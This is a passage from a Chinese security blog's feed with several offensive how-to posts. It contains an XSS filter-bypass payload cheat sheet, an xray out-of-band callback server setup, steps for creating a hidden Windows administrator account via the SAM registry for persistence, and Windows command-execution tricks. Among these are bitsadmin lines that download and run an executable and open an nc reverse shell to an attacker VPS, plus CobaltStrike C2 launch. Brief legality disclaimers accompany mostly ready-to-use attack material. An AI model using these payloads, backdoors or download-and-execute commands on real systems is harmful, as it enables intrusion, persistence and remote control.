onerRor=<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&gt;<br># 双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)<br>&lt;imimgg srsrcc=x onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&gt;<br># 字符拼接(利用<span class="hljs-built_in">eval</span>)<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=aler;b=t;c=&#x27;(xss);&#x27;;eval(a+b+c)&quot;</span>&gt;<br># 字符拼接(利用top)<br>&lt;script&gt;top[<span class="hljs-string">&quot;al&quot;</span>+<span class="hljs-string">&quot;ert&quot;</span>](<span class="hljs-string">``</span>xss<span class="hljs-string">``</span>);&lt;/script&gt;(只有两个<span class="hljs-string">``</span>这里是为了凸显出有<span class="hljs-string">`符号)</span><br></code></pre></td></tr></table></figure><h3 id="其它字符混淆"><a href="#其它字符混淆" class="headerlink" title="其它字符混淆"></a>其它字符混淆</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># 利用注释和标签优先级<br>&lt;&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);<span class="hljs-comment">//&lt;&lt;/script&gt;</span><br>&lt;scri&lt;!--test--&gt;pt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hello world!&quot;</span>)&lt;/scri&lt;!--test--&gt;pt&gt;<br>&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; <br># 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效<br>&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;<br></code></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># <span class="hljs-title class_">Unicode</span>编码绕过<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;&amp;# 97;&amp;# 108;&amp;# 101;&amp;# 114;&amp;# 116;&amp;# 40;&amp;# 34;&amp;# 120;&amp;# 115;&amp;# 115;&amp;# 34;&amp;# 41;&amp;# 59;&quot;</span>&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;<br># url编码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;<br># Ascii码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;<br># Hex绕过<br>&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;<br># 八进制绕过<br>&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;<br># base64绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br></code></pre></td></tr></table></figure><h3 id="过滤双引号，单引号"><a href="#过滤双引号，单引号" class="headerlink" title="过滤双引号，单引号"></a>过滤双引号，单引号</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># html标签内可省略引号；js中可用反引号代替单双引号<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">``</span>xss<span class="hljs-string">``</span>);&gt;<br># 使用编码绕过<br></code></pre></td></tr></table></figure><h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># 括号被过滤可用<span class="hljs-keyword">throw</span>绕过<br>&lt;svg/onload=<span class="hljs-string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># 使用url编码<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">``</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;</span><br># 使用<span class="hljs-variable constant_">IP</span>格式<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">``</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//2130706433/``&gt;十进制</span><br>&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制<br>&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制<br>&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;html标签中用//代替http://<br># 使用反斜杠（注意Windows下为file协议）<br># 中文逗号代替英文逗号<br>&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www。baidu。com``&quot;&gt;//会自动跳转<br></code></pre></td></tr></table></figure><hr><h2 id="📌-3、绕过思路"><a href="#📌-3、绕过思路" class="headerlink" title="📌 3、绕过思路"></a>📌 3、绕过思路</h2><h3 id="一、白名单绕过"><a href="#一、白名单绕过" class="headerlink" title="一、白名单绕过"></a>一、白名单绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;title&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;xxx&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="1-闭合标签构造语句"><a href="#1-闭合标签构造语句" class="headerlink" title="1.闭合标签构造语句"></a>1.闭合标签构造语句</h4><p>当白名单较宽松，” 和 &lt;&gt; 均可用时：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;title&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(5)&quot;</span>/&gt;</span>&quot;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>若 “ 被限制，可利用HTML标签优先级：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;title&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&lt;/title&gt;</span></span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&lt;img src=1 onerror=alert(1)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="2-闭合属性构造xss"><a href="#2-闭合属性构造xss" class="headerlink" title="2.闭合属性构造xss"></a>2.闭合属性构造xss</h4><p>若 &lt;&gt; 不可用，但onerror属性可控，可闭合src属性构造：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;title&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>若 &lt;&gt; ‘ “ 全部限制，可用实体编码绕过：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><hr><h3 id="二、绕过长度限制"><a href="#二、绕过长度限制" class="headerlink" title="二、绕过长度限制"></a>二、绕过长度限制</h3><p>长度限制在20字符以内时，可用分段拼接：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;p&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;xxx&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><br># 基本闭合语句<br><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p>此语句较长，可用多点分段结合注释拼接：</p><h4 id="1-利用注释符拼接"><a href="#1-利用注释符拼接" class="headerlink" title="1.利用注释符拼接"></a>1.利用注释符拼接</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;p&gt;&lt;img src=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;<br>&lt;p&gt;&lt;img src=&quot;*/alert(1)/*&quot;&gt;&lt;/p&gt;<br>&lt;p&gt;&lt;img src=&quot;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>xss漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建 xray 反连平台的方法</title>
    <link href="/2024/07/01/%E6%90%AD%E5%BB%BA%20xray%20%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <url>/2024/07/01/%E6%90%AD%E5%BB%BA%20xray%20%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>在进行漏洞检测的时候，我们会发现有很多的漏洞在执行了一些命令后，从表面上看没有任何回应的，比如命令执行漏洞，可以让目标执行读取文件的命令等，但由于前端并没有对应的展示，导致我们并不能知道文件是否成功读取，也就不知道命令是否执行成功。同时还有向经典的log4j rce，fastjson，ssrf等，都是没有回显的漏洞，那么当面对这类的漏洞，我们就需要一个反连平台，通过让目标执行ping、curl等命令，对反连平台发起请求，反连平台在接受到请求后，就能告诉我们，命令触发了，也就代表了漏洞存在了。 所以当我们想要比较完备的对一个系统进行测试，反连平台的利用一定是必不可少的。所以本文将着重讲述xray的反连平台如何部署搭建，配置文件如何修改，如何进行调试，并使用实际存在的漏洞进行举例。</p><h4 id="1、被动扫描"><a href="#1、被动扫描" class="headerlink" title="1、被动扫描"></a>1、被动扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xray.exe webscan --listen 127.0.0.1:7777 --html-output vuln.html<br></code></pre></td></tr></table></figure><h4 id="2、xray配置"><a href="#2、xray配置" class="headerlink" title="2、xray配置"></a>2、xray配置</h4><h5 id="服务端配置-config-yaml"><a href="#服务端配置-config-yaml" class="headerlink" title="服务端配置(config.yaml)"></a>服务端配置(config.yaml)</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">reverse:</span><br>  <span class="hljs-attr">db_file_path:</span> <span class="hljs-string">&quot;reverse.db&quot;</span>                      <span class="hljs-comment"># 反连平台数据库文件位置, 这是一个 KV 数据库</span><br>  <span class="hljs-attr">token:</span> <span class="hljs-string">&quot;password&quot;</span>             <span class="hljs-comment"># 反连平台认证的 Token, 自己预设一个字符串，和客户端一致</span><br>  <span class="hljs-attr">http:</span><br>    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <br>    <span class="hljs-attr">listen_port:</span> <span class="hljs-string">&quot;8001&quot;</span>       <span class="hljs-comment">#设置端口</span><br>    <span class="hljs-attr">ip_header:</span> <span class="hljs-string">&quot;&quot;</span>                       <span class="hljs-comment"># 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取</span><br>  <span class="hljs-attr">dns:</span><br>    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <br>    <span class="hljs-attr">domain:</span> <span class="hljs-string">&quot;xxx.com&quot;</span>                   <span class="hljs-comment">#自己购买域名</span><br>    <span class="hljs-attr">is_domain_name_server:</span> <span class="hljs-literal">false</span>        <span class="hljs-comment"># 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了</span><br>    <span class="hljs-attr">resolve:</span>                            <span class="hljs-comment"># DNS 静态解析规则</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">A</span>                           <span class="hljs-comment"># A, AAAA, TXT 三种</span><br>      <span class="hljs-attr">record:</span> <span class="hljs-string">ns1</span><br>      <span class="hljs-attr">value:</span> <span class="hljs-number">121.4</span><span class="hljs-string">.x.x</span>       <span class="hljs-comment">#服务端公网主机ip</span><br>      <span class="hljs-attr">ttl:</span> <span class="hljs-number">60</span>    <br>  <span class="hljs-attr">client:</span><br>    <span class="hljs-attr">remote_server:</span> <span class="hljs-literal">false</span>                <span class="hljs-comment"># 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址</span><br>    <span class="hljs-attr">http_base_url:</span> <span class="hljs-string">&quot;&quot;</span>                   <span class="hljs-comment"># 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置</span><br>    <span class="hljs-attr">dns_server_ip:</span> <span class="hljs-string">&quot;&quot;</span>                   <span class="hljs-comment"># 和 http_base_url 类似，实际用来访问 dns 服务器的地址</span><br></code></pre></td></tr></table></figure><h5 id="客户端配置-config-yaml"><a href="#客户端配置-config-yaml" class="headerlink" title="客户端配置(config.yaml)"></a>客户端配置(config.yaml)</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">reverse:</span><br>  <span class="hljs-attr">db_file_path:</span> <span class="hljs-string">&quot;&quot;</span>                      <span class="hljs-comment"># 反连平台数据库文件位置, 这是一个 KV 数据库</span><br>  <span class="hljs-attr">token:</span> <span class="hljs-string">&quot;password&quot;</span>                   <span class="hljs-comment"># 和服务端一致。反连平台认证的 Token, 独立部署时不能为空</span><br>  <span class="hljs-attr">http:</span><br>    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <br>    <span class="hljs-attr">listen_port:</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-attr">ip_header:</span> <span class="hljs-string">&quot;&quot;</span>                       <span class="hljs-comment"># 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取</span><br>  <span class="hljs-attr">dns:</span><br>    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <br>    <span class="hljs-attr">domain:</span> <span class="hljs-string">&quot;&quot;</span>                          <span class="hljs-comment"># DNS 域名配置</span><br>    <span class="hljs-attr">is_domain_name_server:</span> <span class="hljs-literal">false</span>        <span class="hljs-comment"># 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了</span><br>    <span class="hljs-attr">resolve:</span>                            <span class="hljs-comment"># DNS 静态解析规则</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">A</span>                           <span class="hljs-comment"># A, AAAA, TXT 三种</span><br>      <span class="hljs-attr">record:</span> <span class="hljs-string">localhost</span><br>      <span class="hljs-attr">value:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>      <span class="hljs-attr">ttl:</span> <span class="hljs-number">60</span><br>  <span class="hljs-attr">client:</span><br>    <span class="hljs-attr">remote_server:</span> <span class="hljs-literal">true</span>                <span class="hljs-comment"># 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址</span><br>    <span class="hljs-attr">http_base_url:</span> <span class="hljs-string">&quot;http://121.4.x.x:8001&quot;</span>                   <span class="hljs-comment"># 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置</span><br>    <span class="hljs-attr">dns_server_ip:</span> <span class="hljs-string">&quot;121.4.x.x&quot;</span>                   <span class="hljs-comment"># 和 http_base_url 类似，实际用来访问 dns 服务器的地址</span><br></code></pre></td></tr></table></figure><h4 id="3、服务端开启"><a href="#3、服务端开启" class="headerlink" title="3、服务端开启"></a>3、服务端开启</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./xray reverse<br><span class="hljs-comment">#后台运行，无日志记录</span><br><span class="hljs-built_in">nohup</span> ./xray reverse &gt;/dev/null 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/51361feb79193c0e3ea93394aeaf9b7.jpg" alt="img"></p><h4 id="4、Fastjson漏洞测试"><a href="#4、Fastjson漏洞测试" class="headerlink" title="4、Fastjson漏洞测试"></a>4、Fastjson漏洞测试</h4><p>burpsuite转发流量到127.0.0.1:7777，xray开启被动扫描</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/e2c9f626ec9e4d1a7a82c899409cc44.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/a2b174a22265f2319e4c1972e4d4ba8.jpg" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>xray</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows系统添加隐藏账户</title>
    <link href="/2024/07/01/Windows%E7%B3%BB%E7%BB%9F%E6%B7%BB%E5%8A%A0%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7/"/>
    <url>/2024/07/01/Windows%E7%B3%BB%E7%BB%9F%E6%B7%BB%E5%8A%A0%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7/</url>
    
    <content type="html"><![CDATA[<h4 id="🚀-0、简介"><a href="#🚀-0、简介" class="headerlink" title="🚀 0、简介"></a>🚀 0、简介</h4><p>​在 Windows 提权成功后，为了维持访问权限，攻击者往往会添加一个隐藏账户 🕵️‍♂️。<br>这种账户可以绕过常规检测，达到后门驻留效果，适用于渗透测试与红队演练中对持久化的研究。</p><hr><h4 id="📌-1、命令行隐藏账户"><a href="#📌-1、命令行隐藏账户" class="headerlink" title="📌 1、命令行隐藏账户"></a>📌 1、命令行隐藏账户</h4><p>​可以使用 <code>net user</code> 命令新建一个带 <code>$</code> 符号的用户，这种账户不会在 <code>net user</code> 命令结果里显示，但依然存在于系统中 ⚙️。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建一个以 $ 结尾的隐藏账户</span><br>net user hacker$ password /add<br><br><span class="hljs-comment"># 将该账户加入 Administrators 组，获得管理员权限</span><br>net localgroup administrators hacker$ /add<br></code></pre></td></tr></table></figure><p>📷 命令执行示例：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206164548.png" alt="img"></p><blockquote><p>⚠️ 注意：虽然 <code>net user</code> 列表里看不到，但在 <strong>计算机管理 ➜ 本地用户和组</strong> 中仍然可以看到该账户 👀。</p></blockquote><p>📷 本地用户和组查看示例：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206151940.png" alt="img"></p><hr><h4 id="🗝️-2、注册表隐藏账户"><a href="#🗝️-2、注册表隐藏账户" class="headerlink" title="🗝️ 2、注册表隐藏账户"></a>🗝️ 2、注册表隐藏账户</h4><p>&#x9;如果想让账户在 <strong>本地用户和组</strong> 里也无法显示，可通过修改注册表进一步隐藏账户 👇</p><p>✅ <strong>操作步骤：</strong></p><p>1️⃣ 打开注册表编辑器，找到：<br><code>HKEY_LOCAL_MACHINE\SAM\SAM</code><br>右键 ➜ 权限 ➜ 给 Administrators 组添加完全控制权限。</p><p>2️⃣ F5 刷新后，定位到：<br><code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\hacker$</code><br>记下该账户对应的类型（如 <code>000003EB</code>），将该键和值一并导出。</p><p>3️⃣ 同样找到 <code>Administrator</code> 对应的类型（如 <code>000001F4</code>），也导出。</p><p>4️⃣ 删除原先的 <code>hacker$</code> 用户（用 <code>net user hacker$ /del</code>），然后编辑导出的 <code>.reg</code> 文件，保留 <code>hacker$</code> 的注册表信息。</p><p>5️⃣ 将 <code>.reg</code> 文件导入注册表，刷新查看，原本在 <strong>本地用户和组</strong> 中可见的 <code>hacker$</code> 已经被隐藏 🫥。</p><p>6️⃣ 使用 <code>hacker$</code> 登录，即可拥有 Administrator 权限 🪪。</p><p>📷 注册表修改示例：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20200322001639.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206154319.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206160517.png" alt="img"></p><p>📷 隐藏后效果：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206161451-1024x726.png" alt="img"></p><hr><h4 id="⚠️-3、结语"><a href="#⚠️-3、结语" class="headerlink" title="⚠️ 3、结语"></a>⚠️ 3、结语</h4><p>&#x9;这种方法仅供<strong>合法授权的渗透测试</strong>或<strong>攻防演练</strong>使用，切勿用于非法目的 🚫！<br>对防御者来说，<strong>定期审计账户和注册表</strong>、配合基线检测与域控安全策略，可以有效发现这类隐藏账户 🛡️。</p><hr><p>✅ <strong>安全提示：</strong></p><ul><li>生产环境中严禁随意添加隐藏账户。</li><li>及时检测系统账户异常，及时更新安全补丁。</li><li>配合 SIEM、HIDS、EDR 进行行为监控。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>权限维持</tag>
      
      <tag>后门</tag>
      
      <tag>隐藏账户</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows系统命令执行的几种姿势</title>
    <link href="/2024/07/01/Windows%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
    <url>/2024/07/01/Windows%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h4 id="🚀-0、简介"><a href="#🚀-0、简介" class="headerlink" title="🚀 0、简介"></a>🚀 0、简介</h4><p>​当我们在渗透测试中拿到目标 Shell 🐚 后，通常需要进一步执行命令、上线、维持权限。<br>本文总结了几种常见的 <strong>Windows 命令执行姿势</strong>，供学习研究使用。</p><hr><h4 id="📌-1、CobaltStrike-命令上线"><a href="#📌-1、CobaltStrike-命令上线" class="headerlink" title="📌 1、CobaltStrike 命令上线"></a>📌 1、CobaltStrike 命令上线</h4><p>​使用 <strong>CobaltStrike</strong> 可以方便地生成 PowerShell Payload，用于命令行上线到 C2 💻。</p><p>📷 演示：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/cs.gif" alt="img"></p><hr><h4 id="📌-2、bitsadmin"><a href="#📌-2、bitsadmin" class="headerlink" title="📌 2、bitsadmin"></a>📌 2、bitsadmin</h4><p>​<code>bitsadmin</code> 是 Windows 内置的一个命令行工具，可用于创建下载&#x2F;上传任务，并监控其进度 🔄。</p><p>⚠️ 注意：</p><ul><li>需要 <strong>管理员权限</strong>，普通用户无法使用。</li><li>保存文件时需使用 <strong>绝对路径</strong>。</li></ul><p>✅ <strong>示例：下载执行文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xxx.com/artifact.exe C:\shell.exe &amp; start C:\shell.exe<br></code></pre></td></tr></table></figure><p>✅ <strong>使用 nc 反弹 shell：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xxx.com/nc.exe C:\nc.exe &amp; start C:\nc.exe -t -e cmd.exe vps_ip 6667<br></code></pre></td></tr></table></figure><hr><h4 id="📌-3、certutil"><a href="#📌-3、certutil" class="headerlink" title="📌 3、certutil"></a>📌 3、certutil</h4><p>&#x9;<code>certutil</code> 是 Windows 自带的证书服务工具 📜，可用于下载文件，适用于 <strong>XP 到 Win10</strong>。</p><p>⚠️ certutil 下载文件会在本地留缓存，建议操作完成后删除缓存。</p><p>✅ <strong>缓存位置：</strong></p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">USERPROFILE</span></span>%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content<br></code></pre></td></tr></table></figure><p>✅ <strong>示例：下载并执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 